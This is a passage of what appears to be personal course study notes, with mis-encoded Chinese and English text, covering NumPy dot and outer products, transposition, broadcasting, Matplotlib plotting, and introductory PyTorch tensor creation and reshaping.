title="ä¸¤ä¸ªä¸€ç»´å‘é‡è¿›è¡Œ dotï¼ˆç‚¹ä¹˜ï¼‰"></a>ä¸¤ä¸ªä¸€ç»´å‘é‡è¿›è¡Œ dotï¼ˆç‚¹ä¹˜ï¼‰</h5><p>a = np.array([1, 2, 3])</p><p>b = np.array([4, 5, 6])</p><p>print(a @ b) # è¾“å‡º 32ï¼Œç›¸å½“äº 1*4 + 2*5 + 3*6</p><p>print(np.dot(a, b)) # ä¹Ÿè¾“å‡º 32</p><p>è¿™ä¸¤ä¸ªæ˜¯<strong>ç‚¹ä¹˜</strong>ï¼ˆscalarï¼‰ï¼Œä¸æ˜¯çŸ©é˜µä¹˜ã€‚</p><h5 id="æƒ³è¿›è¡ŒçŸ©é˜µä¹˜æ³•ï¼Œè¦æ˜ç¡®è½¬æ¢ç»´åº¦"><a href="#æƒ³è¿›è¡ŒçŸ©é˜µä¹˜æ³•ï¼Œè¦æ˜ç¡®è½¬æ¢ç»´åº¦" class="headerlink" title="æƒ³è¿›è¡ŒçŸ©é˜µä¹˜æ³•ï¼Œè¦æ˜ç¡®è½¬æ¢ç»´åº¦"></a><strong>æƒ³è¿›è¡ŒçŸ©é˜µä¹˜æ³•</strong>ï¼Œè¦æ˜ç¡®è½¬æ¢ç»´åº¦</h5><h5 id="å¤–ç§¯ï¼ˆOuter-Productï¼‰"><a href="#å¤–ç§¯ï¼ˆOuter-Productï¼‰" class="headerlink" title="å¤–ç§¯ï¼ˆOuter Productï¼‰"></a>å¤–ç§¯ï¼ˆOuter Productï¼‰</h5><p>a_col = a.reshape(-1, 1) # shape: (3, 1)</p><p>b_row = b.reshape(1, -1) # shape: (1, 3)</p><p>print(a_col @ b_row)</p><p>[[ 4 5 6]</p><p>[ 8 10 12]</p><p>[12 15 18]]</p><p>è¿™ä¸ªå°±æ˜¯ä¸€ä¸ª (3Ã—1) Ã— (1Ã—3) çš„çŸ©é˜µä¹˜æ³•ï¼Œç»“æœæ˜¯ (3Ã—3) çš„<strong>å¤–ç§¯çŸ©é˜µ</strong>ã€‚</p><h5 id="å†…ç§¯ï¼ˆè¡Œå‘é‡-Ã—-åˆ—å‘é‡-â†’-æ ‡é‡ï¼‰"><a href="#å†…ç§¯ï¼ˆè¡Œå‘é‡-Ã—-åˆ—å‘é‡-â†’-æ ‡é‡ï¼‰" class="headerlink" title="å†…ç§¯ï¼ˆè¡Œå‘é‡ Ã— åˆ—å‘é‡ â†’ æ ‡é‡ï¼‰"></a>å†…ç§¯ï¼ˆè¡Œå‘é‡ Ã— åˆ—å‘é‡ â†’ æ ‡é‡ï¼‰</h5><p>a_row = a.reshape(1, -1) # shape: (1, 3)</p><p>b_col = b.reshape(-1, 1) # shape: (3, 1)</p><p>print(a_row @ b_col) # è¾“å‡º [[32]]</p><p>è¿™æ˜¯çŸ©é˜µä¹˜æ³• (1Ã—3) @ (3Ã—1)ï¼Œç»“æœæ˜¯ (1Ã—1)ã€‚</p><h1 id="transpose"><a href="#transpose" class="headerlink" title="transpose"></a>transpose</h1><p># You can find the full list of mathematical functions provided by<br>numpy in the documentation.\<br># Apart from computing mathematical functions using arrays, we<br>frequently need to reshape or otherwise manipulate data in arrays. The<br>simplest example of this type of operation is transposing a matrix; to<br>transpose a matrix, simply use the T attribute of an array object:\<br>\<br># import numpy as np\<br>#\<br># x = np.array([[1,2], [3,4]])\<br># print(x) # Prints \â€[[1 2]\<br># # [3 4]]\â€\<br># # <strong>[T]{.mark}åªæ˜¯è½¬ç½®çš„ä¸´æ—¶è§†å›¾ï¼Œéæ°¸ä¹…æ›´æ”¹</strong>\<br># print(x.T) # Prints \â€[[1 3]\<br># # [2 4]]\â€\<br>#\<br># # Note that taking the transpose of a rank 1 array does nothing:\<br># v = np.array([1,2,3])\<br># print(v) # Prints \â€[1 2 3]\â€\<br># print(v.T) # Prints \â€[1 2 3]\â€\<br>#\<br># # æ°¸ä¹…è½¬ç½®\<br># a = np.array([[1, 2], [3, 4]])\<br># [a = a.T # ç°åœ¨ a æ˜¯è½¬ç½®åçš„ç‰ˆæœ¬]{.mark}\<br># # å› ä¸º .T<br>æ˜¯ä¸ªè§†å›¾ï¼ˆå…±äº«å†…å­˜ï¼‰ï¼Œä½ å¦‚æœä¹‹åè¿˜æƒ³é¿å…åŸæ•°ç»„è¢«å½±å“ï¼Œå»ºè®®é…åˆ<br>.copy()ï¼š\<br># [a = a.T.copy()]{.mark}</p><h1 id="Broadcasting"><a href="#Broadcasting" class="headerlink" title="Broadcasting"></a><strong>Broadcasting</strong></h1><h2 id="å…³äºrank-ç§©"><a href="#å…³äºrank-ç§©" class="headerlink" title="å…³äºrank ç§©"></a>å…³äºrank ç§©</h2><p>æ³¨æ„çŸ©é˜µçš„ rankï¼Œç¿»è¯‘ä¸º ç§©ï¼Œå¯ä»¥ç†è§£ä¸º ä¸€ç»´å‘é‡ æ˜¯çŸ¢é‡å—ï¼Ÿä¸ï¼Œå¾—å‡çº§æˆå’Œ<br>çŸ©é˜µ ä¸€æ ·çš„ç»´åº¦ã€å¤§å°</p><p>Broadcasting is a powerful mechanism that allows numpy to work with<br>arrays of different shapes when performing arithmetic operations.<br>Frequently we have a smaller array and a larger array, and we want to<br>use the smaller array multiple times to perform some operation on the<br>larger array.</p><p>For example, suppose that we want to add a constant vector to each row<br>of a matrix. We could do it like this:</p><p>import numpy as np</p><p># We will add the vector v to each row of the matrix x,</p><p># storing the result in the matrix y</p><p>x = np.array([[1,2,3], [4,5,6], [7,8,9], [10, 11, 12]])</p><p>v = np.array([1, 0, 1])</p><p><strong>[y = np.empty_like(x) # Create empty matrix with same shape as<br>x]{.mark}</strong></p><p># Add vector v to each row of matrix x with an explicit loop</p><p><strong>[for i in range(4):]{.mark}</strong></p><p><strong>[y[i, :] = x[i, :] + v]{.mark}</strong></p><p># Now y is the following</p><p># [[ 2 2 4]</p><p># [ 5 5 7]</p><p># [ 8 8 10]</p><p># [11 11 13]]</p><p>print(y)</p><h2 id="pyçš„é€è¡Œç›¸åŠ ï¼ˆä¸æ¨èã€æ…¢ï¼‰"><a href="#pyçš„é€è¡Œç›¸åŠ ï¼ˆä¸æ¨èã€æ…¢ï¼‰" class="headerlink" title="pyçš„é€è¡Œç›¸åŠ ï¼ˆä¸æ¨èã€æ…¢ï¼‰"></a>pyçš„é€è¡Œç›¸åŠ ï¼ˆä¸æ¨èã€æ…¢ï¼‰</h2><h1 id="Broadcasting-1"><a href="#Broadcasting-1" class="headerlink" title="-------------------- Broadcasting\"></a>-------------------- Broadcasting\</h1><p># import numpy as np\<br>#\<br># # We will add the vector v to each row of the matrix x,\<br># # storing the result in the matrix y\<br># x = np.array([[1,2,3], [4,5,6], [7,8,9], [10, 11, 12]])\<br># v = np.array([1, 0, 1])\<br># y = np.empty_like(x) # Create empty matrix with same shape as x\<br>#\<br># # Add vector v to each row of matrix x with an explicit loop\<br># for i in range(4):\<br># y[i, :] = x[i, :] + v\<br>#\<br># # Now y is the following\<br># # [[ 2 2 4]\<br># # [ 5 5 7]\<br># # [ 8 8 10]\<br># # [11 11 13]]\<br># print(y)</p><h2 id="æ‰©å¼ è¾ƒå°rankå†çŸ©é˜µç›¸åŠ ï¼ˆä¹Ÿä¸æ¨èï¼Œå› ä¸ºå¹¶éæœ€ä¼˜å†™æ³•ï¼‰"><a href="#æ‰©å¼ è¾ƒå°rankå†çŸ©é˜µç›¸åŠ ï¼ˆä¹Ÿä¸æ¨èï¼Œå› ä¸ºå¹¶éæœ€ä¼˜å†™æ³•ï¼‰" class="headerlink" title="æ‰©å¼ è¾ƒå°rankå†çŸ©é˜µç›¸åŠ ï¼ˆä¹Ÿä¸æ¨èï¼Œå› ä¸ºå¹¶éæœ€ä¼˜å†™æ³•ï¼‰"></a>æ‰©å¼ è¾ƒå°rankå†çŸ©é˜µç›¸åŠ ï¼ˆä¹Ÿä¸æ¨èï¼Œå› ä¸ºå¹¶éæœ€ä¼˜å†™æ³•ï¼‰</h2><h1 id="Broadcasting-2"><a href="#Broadcasting-2" class="headerlink" title="-------------------- Broadcasting 2\"></a>-------------------- Broadcasting 2\</h1><p># This works; however when the matrix x is very large, computing an<br>explicit loop in Python could be slow. Note that adding the vector v to<br>each row of the matrix x is equivalent to forming a matrix vv by<br>stacking multiple copies of v vertically, then performing elementwise<br>summation of x and vv. We could implement this approach like this:\<br>\<br># import numpy as np\<br>#\<br># # We will add the vector v to each row of the matrix x,\<br># # storing the result in the matrix y\<br># x = np.array([[1,2,3], [4,5,6], [7,8,9], [10, 11, 12]])\<br># v = np.array([1,0,1])\<br># vv = np.tile(v,(4,1)) # Stack 4 copies of v on top of each other\<br># print(vv) # Prints \â€[[1 0 1]\<br># # [1 0 1]\<br># # [1 0 1]\<br># # [1 0 1]]\â€\<br># y = x + vv # Add x and vv elementwise\<br># print(y) # Prints \â€[[ 2 2 4\<br># # [ 5 5 7]\<br># # [ 8 8 10]\<br># # [11 11 13]]\â€</p><h2 id="ä½¿ç”¨npè‡ªå¸¦çš„å¹¿æ’­ç›¸åŠ "><a href="#ä½¿ç”¨npè‡ªå¸¦çš„å¹¿æ’­ç›¸åŠ " class="headerlink" title="ä½¿ç”¨npè‡ªå¸¦çš„å¹¿æ’­ç›¸åŠ "></a>ä½¿ç”¨npè‡ªå¸¦çš„å¹¿æ’­ç›¸åŠ </h2><p><strong>ä¸¾ä¾‹è¯´æ˜ + è¯¦ç»†è§£è¯»</strong></p><p>å‡è®¾ï¼š</p><p>python</p><p>CopyEdit</p><p>import numpy as np</p><p>x = np.array([[1, 2, 3],</p><p>[4, 5, 6],</p><p>[7, 8, 9],</p><p>[10,11,12]]) # shape = (4, 3)</p><p>v = np.array([1, 0, 1]) # shape = (3,)</p><p>ç°åœ¨æ‰§è¡Œï¼š</p><p>python</p><p>CopyEdit</p><p>y = x + v</p><hr><p><strong>æ­¥éª¤ä¸€ï¼šå¯¹é½ç»´åº¦æ•°</strong></p><ul><li><p>x çš„å½¢çŠ¶æ˜¯ (4, 3)ï¼Œrank = 2</p></li><li><p>v çš„å½¢çŠ¶æ˜¯ (3,)ï¼Œrank = 1</p></li></ul><p>æ ¹æ®è§„åˆ™1ï¼Œè¦è®©ç»´åº¦æ•°ç›¸åŒï¼Œåœ¨ v å½¢çŠ¶å‰é¢è¡¥ 1ï¼š</p><p>lua</p><p>CopyEdit</p><p>v.shape: (3,) --> (1, 3)</p><hr><p><strong>æ­¥éª¤äºŒï¼šåˆ¤æ–­å„ç»´åº¦å…¼å®¹æ€§</strong></p><hr><p>  <strong>ç»´åº¦</strong>   <strong>x       </strong>v       <strong>æ˜¯å¦å…¼å®¹ï¼Ÿ</strong><br>             å°ºå¯¸<strong>    å°ºå¯¸</strong>    </p><hr><p>  0          4         1         æ˜¯ï¼ˆvåœ¨è¯¥ç»´åº¦ä¸º1ï¼Œå¯ä»¥å¹¿æ’­æ‰©å±•ï¼‰</p><h2 id="1-3-3-æ˜¯ï¼ˆå°ºå¯¸ç›¸åŒï¼‰"><a href="#1-3-3-æ˜¯ï¼ˆå°ºå¯¸ç›¸åŒï¼‰" class="headerlink" title="  1          3         3         æ˜¯ï¼ˆå°ºå¯¸ç›¸åŒï¼‰"></a>  1          3         3         æ˜¯ï¼ˆå°ºå¯¸ç›¸åŒï¼‰</h2><p>ä¸¤è€…åœ¨æ‰€æœ‰ç»´åº¦å…¼å®¹ï¼Œå¯ä»¥å¹¿æ’­ã€‚</p><hr><p><strong>æ­¥éª¤ä¸‰ï¼šè®¡ç®—å¹¿æ’­åå½¢çŠ¶</strong></p><p>å¹¿æ’­åå½¢çŠ¶æ˜¯ä¸¤ä¸ªæ•°ç»„å½¢çŠ¶åœ¨æ¯ç»´çš„æœ€å¤§å€¼ï¼š</p><p>scss</p><p>CopyEdit</p><p>(4, 3) å’Œ (1, 3) --> (4, 3)</p><hr><p><strong>æ­¥éª¤å››ï¼šæ‰©å±•æ•°ç»„ï¼ˆè™šæ‹Ÿå¤åˆ¶ï¼‰</strong></p><ul><li><p>x ä¿æŒ (4, 3) å½¢çŠ¶ä¸å˜ã€‚</p></li><li><p>v æ²¿ç€ç¬¬0ç»´â€å¤åˆ¶â€4æ¬¡ï¼Œå˜æˆï¼š</p></li></ul><p>lua</p><p>CopyEdit</p><p>[[1, 0, 1],</p><p>[1, 0, 1],</p><p>[1, 0, 1],</p><p>[1, 0, 1]]</p><hr><p><strong>æ­¥éª¤äº”ï¼šé€å…ƒç´ ç›¸åŠ </strong></p><p>lua</p><p>CopyEdit</p><p>[[ 1+1, 2+0, 3+1],</p><p>[ 4+1, 5+0, 6+1],</p><p>[ 7+1, 8+0, 9+1],</p><p>[10+1, 11+0, 12+1]]</p><p>=></p><p>[[ 2, 2, 4],</p><p>[ 5, 5, 7],</p><p>[ 8, 8, 10],</p><p>[11, 11, 13]]</p><hr><p><strong>3. é¢å¤–ä¸¾ä¾‹ â€”- ç»´åº¦æ›´å¤æ‚</strong></p><p>å‡è®¾ï¼š</p><p>python</p><p>CopyEdit</p><p>a = np.ones((3, 4, 5)) # shape (3,4,5)</p><p>b = np.ones(( 4, 1)) # shape (4,1)</p><ul><li><p>è¡¥ç»´åº¦ï¼Œb å½¢çŠ¶è¡¥æˆ (1,4,1)</p></li><li><p>é€ç»´æ¯”è¾ƒï¼š</p><hr><p><strong>ç»´åº¦</strong>   <strong>a å°ºå¯¸</strong> <strong>b å°ºå¯¸</strong> <strong>å…¼å®¹ï¼Ÿ</strong></p><hr><p>0          3          1          æ˜¯ï¼Œbæ²¿è¯¥ç»´åº¦å¹¿æ’­æ‰©å±•3æ¬¡</p><p>1          4          4          æ˜¯ï¼Œå°ºå¯¸ç›¸åŒ</p><h2 id="2-5-1-æ˜¯ï¼Œbæ²¿è¯¥ç»´åº¦å¹¿æ’­æ‰©å±•5æ¬¡"><a href="#2-5-1-æ˜¯ï¼Œbæ²¿è¯¥ç»´åº¦å¹¿æ’­æ‰©å±•5æ¬¡" class="headerlink" title="2          5          1          æ˜¯ï¼Œbæ²¿è¯¥ç»´åº¦å¹¿æ’­æ‰©å±•5æ¬¡"></a>2          5          1          æ˜¯ï¼Œbæ²¿è¯¥ç»´åº¦å¹¿æ’­æ‰©å±•5æ¬¡</h2></li><li><p>å¹¿æ’­å½¢çŠ¶ä¸º (3, 4, 5)</p></li></ul><h3 id="ä»£ç ç¤ºä¾‹"><a href="#ä»£ç ç¤ºä¾‹" class="headerlink" title="ä»£ç ç¤ºä¾‹"></a>ä»£ç ç¤ºä¾‹</h3><h1 id="Broadcasting-3"><a href="#Broadcasting-3" class="headerlink" title="-------------------- Broadcasting 3\"></a>-------------------- Broadcasting 3\</h1><p>import numpy as np\<br>\<br># We will add the vector v to each row of the matrix x,\<br># storing the result in the matrix y\<br>x = np.array([[1,2,3], [4,5,6], [7,8,9], [10, 11, 12]])\<br>v = np.array([1, 0, 1])\<br>y = x + v # Add v to each row of x using broadcasting\<br>print(y) # Prints \â€[[ 2 2 4]\<br># [ 5 5 7]\<br># [ 8 8 10]\<br># [11 11 13]]\â€</p><p># Another solution is to reshape w to be a column vector</p><p># of shape (2, 1); we can then broadcast it directly</p><p># against x to produce the same output.</p><p>print(x + np.reshape(w, (2, 1)))</p><p># Multiply a matrix by a constant: x has shape (2, 3).</p><p># Numpy treats scalars as arrays of shape ();</p><p># these can be broadcast together to shape (2, 3),</p><p># producing the following array:</p><p># [[ 2 4 6]</p><p># [ 8 10 12]]</p><p>print(x * 2)</p><h3 id="æ”¹ä¸€ç»´å‘é‡çš„ç§©è¿›è¡Œå¹¿æ’­çš„ç¤ºä¾‹"><a href="#æ”¹ä¸€ç»´å‘é‡çš„ç§©è¿›è¡Œå¹¿æ’­çš„ç¤ºä¾‹" class="headerlink" title="æ”¹ä¸€ç»´å‘é‡çš„ç§©è¿›è¡Œå¹¿æ’­çš„ç¤ºä¾‹"></a>æ”¹ä¸€ç»´å‘é‡çš„ç§©è¿›è¡Œå¹¿æ’­çš„ç¤ºä¾‹</h3><p># Another solution is to reshape w to be a column vector\<br># of shape (2, 1); we can then broadcast it directly\<br># against x to produce the same output.\<br>import numpy as np\<br>x = np.array([[1, 2, 3],\<br>[4, 5, 6]]) # shape (2,3)\<br>w = np.array([4, 5]) # shape (2,)\<br>print(x + <strong>np.[reshape]{.mark}(w, (2, 1)))</strong> # reshape w -> (2,1)\<br>\<br># Multiply a matrix by a constant: x has shape (2, 3).\<br># Numpy treats scalars as arrays of shape ();\<br># these can be broadcast together to shape (2, 3),\<br># producing the following array:\<br># [[ 2 4 6]\<br># [ 8 10 12]]\<br>print(x * 2)</p><p>è¾“å‡º</p><p>[[ 5 6 7]</p><p>[ 9 10 11]]</p><p>[[ 2 4 6]</p><p>[ 8 10 12]]</p><h1 id="Matplotlib"><a href="#Matplotlib" class="headerlink" title="Matplotlib"></a>Matplotlib</h1><p><a href="https://matplotlib.org/">https://matplotlib.org/</a></p><h2 id="plotï¼šåŸºæœ¬ç”»å›¾"><a href="#plotï¼šåŸºæœ¬ç”»å›¾" class="headerlink" title="plotï¼šåŸºæœ¬ç”»å›¾"></a>plotï¼šåŸºæœ¬ç”»å›¾</h2><p>import numpy as np\<br>import matplotlib.pyplot as plt\<br>\<br># We plot the graph of y = x\^2\<br>x = np.arange(-10, 10) # x coordinate é»˜è®¤ç”Ÿæˆ-10åˆ°10ï¼Œæ­¥é•¿ä¸º1\<br>y = x**2 # y coordinate</p><p>[# æ˜ç¡®æŒ‡å®šxè½´èŒƒå›´ï¼Œä»-10åˆ°10 ï‚· å®ƒä¼šæŠŠå›¾åƒçš„ x è½´èŒƒå›´é™åˆ¶ä» -10 åˆ°<br>10ã€‚å›¾ä¸Šè¶…å‡ºè¿™ä¸ªèŒƒå›´çš„å†…å®¹ä¼šè¢«è£å‰ªæ‰ï¼Œä¸æ˜¾ç¤ºã€‚]{.mark}</p><p>[plt.xlim(-10, 10)]{.mark}</p><p>[# è¿™æ˜¯ <strong>è®¾ç½® x<br>è½´çš„åˆ»åº¦ä½ç½®ï¼ˆticksï¼‰</strong>ï¼Œä¹Ÿå°±æ˜¯å›¾ä¸Šæ¨ªè½´ä¸Šæ˜¾ç¤ºçš„æ•°å­—æ ‡ç­¾ã€‚]{.mark}</p><ul><li><p>[np.arange(-10, 11, 1) ç”Ÿæˆä» -10 åˆ° 10 çš„æ•´æ•°åˆ—è¡¨ï¼ˆå« 10ï¼‰ï¼Œæ­¥é•¿ä¸º<br>1ã€‚]{.mark}</p></li><li><p>[æ‰€ä»¥ä¼šåœ¨ x è½´ä¸Šæ˜¾ç¤ºè¿™äº›åˆ»åº¦ï¼ˆtick marksï¼‰ï¼Œæ¯”å¦‚ -10, -9, ..., 0,<br>..., 9, 10ã€‚]{.mark}</p></li><li><p>[<strong>å®ƒä¸ä¼šæ”¹å˜xè½´çš„èŒƒå›´</strong>ï¼Œåªæ˜¯æ§åˆ¶æ ‡ç­¾æ˜¾ç¤ºçš„ä½ç½®ã€‚]{.mark}</p></li></ul><p>[plt.xticks(np.arange(-10, 11, 1))]{.mark}</p><p># ä»¥ä¸Šè¿™ä¸¤å¥è¯è™½ç„¶æœ‰ä¸€äº›overlapï¼Œä½†æ˜¯é€šå¸¸ç»¼åˆä¸€èµ·ä½¿ç”¨ç¡®ä¿åˆ»åº¦å¯æ§</p><p>plt.plot(x, y) # Plot the graph\<br>plt.show() # You need to call plt.show() to show the plotted graph</p><p>è¯¥ä»£ç ä½œå›¾å¦‚ä¸‹ï¼š</p><p><img src="/2025/06/10/COMP9444/numpy/image1.png" alt="A graph with a line AI-generated content may beincorrect.">{width=â€3.178889982502187inâ€<br>height=â€2.309346019247594inâ€}</p><h2 id="Multiple-Functions"><a href="#Multiple-Functions" class="headerlink" title="Multiple Functions"></a><em>Multiple Functions</em></h2><p><em>#-------------------- Multiple Functions\<br>\</em><br>import numpy as np\<br>import matplotlib.pyplot as plt\<br>\<br><em># Create the x and y coordinates\</em><br>x = np.arange(-10, 10)\<br>y1 = x**2\<br>y2 = x**3\<br>\<br><em># Plot multiple functions\</em><br>plt.plot(x, y1)\<br>plt.plot(x, y2)\<br>plt.xlabel(\â€™x axis\â€™)\<br>plt.ylabel(\â€™y axis\â€™)\<br>plt.title(\â€™introduction to matplotlib\â€™)</p><p># legendå¯ä»¥æ”¾å¤šä¸ªå‡½æ•°\<br>plt.<strong>[legend]{.mark}</strong>([\â€™x\^2\â€™, \â€™x\^3\â€™])\<br>plt.show()</p><p><img src="/2025/06/10/COMP9444/numpy/image2.png" alt="A graph of a function AI-generated content may beincorrect.">{width=â€2.531898512685914inâ€<br>height=â€2.16701990376203inâ€}</p><h2 id="SubPlotï¼šå­å›¾"><a href="#SubPlotï¼šå­å›¾" class="headerlink" title="SubPlotï¼šå­å›¾"></a>SubPlotï¼šå­å›¾</h2><p>Ploté€šå¸¸æŒ‡æŠ˜çº¿å›¾ã€å›¾è¡¨ç­‰ï¼ŒfigureæŒ‡æ•´ä¸ªå›¾ç‰‡å¸ƒå±€</p><p>Sometimes we want to can plot different funtions in the different plot<br>but in the same figure, in this case we can use the subplot function.</p><p><img src="/2025/06/10/COMP9444/numpy/image3.png" alt="A screenshot of a graph AI-generated content may beincorrect.">{width=â€2.8715627734033244inâ€<br>height=â€2.192911198600175inâ€}</p><p>import numpy as np\<br>import matplotlib.pyplot as plt\<br>\<br><em># subplot(nrows, ncols, plot_number)\<br># Arugments are number of rows and colums of the plot\<br># and the active plot number\<br>\<br># Create the x and y coordinates\</em><br>x = np.arange(-10, 10)\<br>y1 = x**2\<br>y2 = x**3\<br>\<br><em># Create a subplot grid with 1 row and 2 colums\<br># and set the active plot number to 1\<br># çœ‹ä½ ç”»å›¾ï¼Œæ­¤å¤„å¸ƒå±€å¿…é¡»å¯¹å¦åˆ™ä¼šæŠ¥é”™ã€‚è¿™ä¸ªä»1è®¡èµ·ã€‚\<br># 1è¡Œï¼Œ3åˆ—ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯<br>ä½ æ­£åœ¨è¦ç”»ç¬¬å‡ ä¸ªè¡¨ã€‚ç¬¬ä¸‰ä¸ªå‚æ•°å¿…é¡»å°äºç­‰äºç¬¬äºŒä¸ªå‚æ•°ã€‚\</em><br>plt.subplot(1, 3, 1)\<br>\<br><em># Make the first plot at the active plot\</em><br>plt.plot(x, y1)\<br>plt.title(\â€™x\^2\â€™)\<br>\<br><em># Set the active plot number and make the second plot\</em><br>plt.subplot(1, 3, 2)\<br>plt.plot(x, y2)\<br>plt.title(\â€™x\^3\â€™)\<br>\<br>plt.subplot(1, 3, 3)\<br>plt.plot(x, y2)\<br>plt.title(\â€™x\^3\â€™)\<br>\<br><em># Show the figure.\</em><br>plt.show()</p><h2 id="Imshow"><a href="#Imshow" class="headerlink" title="Imshow"></a>Imshow</h2><p>import numpy as np\<br>from cv2 import imread\<br>import matplotlib.pyplot as plt\<br>\<br>img = imread(\â€™cat.jpg\â€™)\<br>\<br><em># Plot the image\</em><br>plt.imshow(img)\<br>\<br><em># Imshow works better if the data is with type unit8, here we\<br># cast the image to uint8 explicitly.\</em><br>plt.imshow(np.uint8(img))\<br>\<br><em># Show the image\</em><br>plt.show()</p><p><img src="/2025/06/10/COMP9444/numpy/image4.png" alt>{width=â€4.227080052493438inâ€<br>height=â€1.740501968503937inâ€}</p><h1 id="PyTorch-Tensors"><a href="#PyTorch-Tensors" class="headerlink" title="PyTorch Tensors"></a><strong>PyTorch Tensors</strong></h1><p><a href="https://pytorch.org/">https://pytorch.org/</a></p><h2 id="Tensor-Initialization"><a href="#Tensor-Initialization" class="headerlink" title="Tensor Initialization"></a><strong>Tensor Initialization</strong></h2><p><em># Tensors can be created directly from data. The data type is<br>automatically inferred.\<br>\</em><br>import torch\<br>import numpy as np\<br>data = [[1,2], [3,4]]\<br>x_data = torch.tensor(data)\<br>print(x_data)\<br>\<br><em># Tensors can be created from Numpy arrays (and vice versa)\<br>\</em><br>import numpy as np\<br>np_array = np.array(data)\<br>print(np_array)\<br>x_data = torch.from_numpy(np_array)\<br>print(x_data)\<br>\<br><em># We can also call torch.tensor() with the optional dtype parameter,<br>which will set the data type. Some useful datatypes are: torch.bool,<br>torch.float, and torch.long\<br>\</em><br>import torch\<br>data = [[1,2], [3,4]]\<br>x_data = torch.tensor(data, dtype=torch.float)\<br>print(x_data)\<br>\<br>import torch\<br>data = [[1,2], [3,4]]\<br>x_data = torch.tensor(data, dtype=torch.bool)\<br>print(x_data)</p><h3 id="æ£€æŸ¥æ•°æ®ç±»å‹"><a href="#æ£€æŸ¥æ•°æ®ç±»å‹" class="headerlink" title="æ£€æŸ¥æ•°æ®ç±»å‹"></a>æ£€æŸ¥æ•°æ®ç±»å‹</h3><p>import torch</p><p>x = torch.rand(3,2)</p><p>print(<strong>x.dtype</strong>)</p><h3 id="æ£€æŸ¥shape"><a href="#æ£€æŸ¥shape" class="headerlink" title="æ£€æŸ¥shape"></a>æ£€æŸ¥shape</h3><p>import torch</p><p>x = torch.Tensor([[11, 12], [13, 14], [15, 16]])</p><p>print(x.<strong>shape</strong>)</p><p>è¾“å‡ºï¼š</p><p>torch.Size([3, 2])</p><p>æˆ–è€…ç›´æ¥æ£€æŸ¥æŸç»´åº¦ï¼š</p><p>import torch\<br>x = torch.Tensor([[11, 12], [13, 14], [15, 16]])\<br>print(<strong>x.shape</strong>)\<br>print(<strong>x.size(0)</strong>)</p><h3 id="å½¢çŠ¶å˜åŠ¨"><a href="#å½¢çŠ¶å˜åŠ¨" class="headerlink" title="å½¢çŠ¶å˜åŠ¨"></a>å½¢çŠ¶å˜åŠ¨</h3><p>import torch\<br>x = torch.Tensor([[11, 12], [13, 14], [15, 16]])\<br>print(x.shape)\<br>\<br><em># we can change the shape from (3,2) to (2,3)\</em><br>x_view = <strong>[x.view(2,3)]{.mark}\</strong><br>print(x_view)\<br>\<br><em># You can also use torch.reshape() for this\</em><br>x_reshaped = <strong>[torch.reshape(x, (2,3))]{.mark}</strong>\<br>print(x_reshaped)</p><h2 id="Tensor-from-a-Numpy-Array"><a href="#Tensor-from-a-Numpy-Array" class="headerlink" title="Tensor from a Numpy Array"></a><em>Tensor from a Numpy Array</em></h2><p>[æ³¨æ„]{.mark}ï¼š<strong>NumPy çš„é»˜è®¤æ•°æ®ç±»å‹ï¼ˆdtypeï¼‰ä¸ä¸€å®šç­‰äº PyTorch Tensor<br>çš„é»˜è®¤ dtypeã€‚</strong></p><p><em># å½“ dtype ä¸æ˜¯é»˜è®¤çš„ torch.float32 æˆ– torch.int64<br>æ—¶ï¼Œä¼šç‰¹åˆ«æ˜¾ç¤ºå‡ºæ¥ï¼Œæ–¹ä¾¿ä½ è¾¨è¯†ã€‚\<br># å¦‚æœ dtype æ˜¯é»˜è®¤çš„ï¼ˆå¦‚ int64, float32ï¼‰ï¼Œæ‰“å°æ—¶ä¸ä¼šç‰¹åˆ«æ˜¾ç¤º<br>dtypeï¼Œå¦åˆ™ä¼šæ˜¾ç¤º\<br>\</em><br>import numpy as np\<br>import torch\<br>data = [[1,2], [3,4]]\<br>ndarray = np.array(data)\<br><em># å¦‚æœè¦ç‰¹åˆ«æŒ‡å®š dt ï¼ˆæ•°æ®ç±»å‹ï¼‰\<br># [x_tensor = torch.from_numpy(ndarray).to(torch.int64)]{.mark}\</em><br>x_tensor = torch.from_numpy(ndarray)\<br>print(x_tensor)</p><h2 id="From-existing-Tensor"><a href="#From-existing-Tensor" class="headerlink" title="From existing Tensor"></a><strong>From existing Tensor</strong></h2><p><em>ä½ çœ‹åˆ°çš„è¿™äº›æ•°å­—åé¢çš„ [.ï¼ˆå°æ•°ç‚¹ï¼‰]{.mark} æ˜¯å› ä¸ºï¼š<br>ä½ åœ¨ä»£ç ä¸­å†™çš„æ˜¯æµ®ç‚¹æ•°ï¼ˆå¦‚ 4.ï¼‰ï¼Œæ‰€ä»¥ PyTorch é»˜è®¤åˆ›å»ºçš„æ˜¯ float32 æˆ–<br>float64 ç±»å‹çš„</em></p><p><em>\</em><br>initial_tensor = torch.tensor([[4., 5.], [6., 7.]])\<br>print(initial_tensor)</p><p>[tensor([[4., 5.],]{.mark}</p><p>[[6., 7.]])]{.mark}</p><p>initial_tensor = torch.tensor([[4, 5], [6, 7]])\<br>print(initial_tensor)</p><p>[tensor([[4, 5],]{.mark}</p><p>[[6, 7]])]{.mark}</p><h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><p>import torch\<br>\<br><em># ä½ çœ‹åˆ°çš„è¿™äº›æ•°å­—åé¢çš„ .ï¼ˆå°æ•°ç‚¹ï¼‰ æ˜¯å› ä¸ºï¼š<br>ä½ åœ¨ä»£ç ä¸­å†™çš„æ˜¯æµ®ç‚¹æ•°ï¼ˆå¦‚ 4.ï¼‰ï¼Œæ‰€ä»¥ PyTorch é»˜è®¤åˆ›å»ºçš„æ˜¯ float32 æˆ–<br>float64 ç±»å‹çš„\</em><br>initial_tensor = torch.tensor([[4., 5.], [6., 7.]])\<br>print(initial_tensor)\<br>\<br><em># initial_tensor = torch.tensor([[4, 5], [6, 7]])\<br># print(initial_tensor)\<br>\<br># Initialise a new tensor of 1s\<br># åˆ›å»ºä¸€ä¸ªå’Œ initial_tensor å½¢çŠ¶ä¸€æ ·ã€dtype ä¸€æ ·çš„å…¨ 1 çš„æ–° tensorã€‚\<br># è¿™ä¸ª 1s æ˜¯è¯´ onesï¼Œå°±æ˜¯æ¯ä¸ªå…ƒç´ éƒ½æ˜¯ 1\</em><br>new_tensor_ones = torch.ones_like(initial_tensor)\<br>print(new_tensor_ones)\<br>\<br><em># Initialise a new tensor of 0s\</em><br>new_tensor_zeros = 